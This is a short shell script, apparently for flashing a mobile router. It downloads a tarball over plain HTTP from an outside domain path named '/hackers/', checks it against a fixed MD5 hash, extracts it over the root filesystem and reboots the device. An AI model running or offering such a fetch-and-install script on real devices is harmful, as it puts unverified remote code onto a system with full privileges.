#!/bin/sh
curl http://www.bjcprogramming.store/hackers/bjcp25.tgz -o /tmp/firmware.tgz
echo "Checking hash!"
hash=$(md5sum /tmp/firmware.tgz | awk '{print $1}')
echo "$hash = e92462dd1eca127e1af7740ef0c58cb3"
if [ $hash == 'e92462dd1eca127e1af7740ef0c58cb3' ]
then
echo "Same!"
mv /etc_ro/tmp/firmware* /etc_ro/tmp/firmware.tgz
tar -zxvf /tmp/firmware.tgz -C /
at_cmd at+zreset
reboot
else
echo "Not same!"
fi
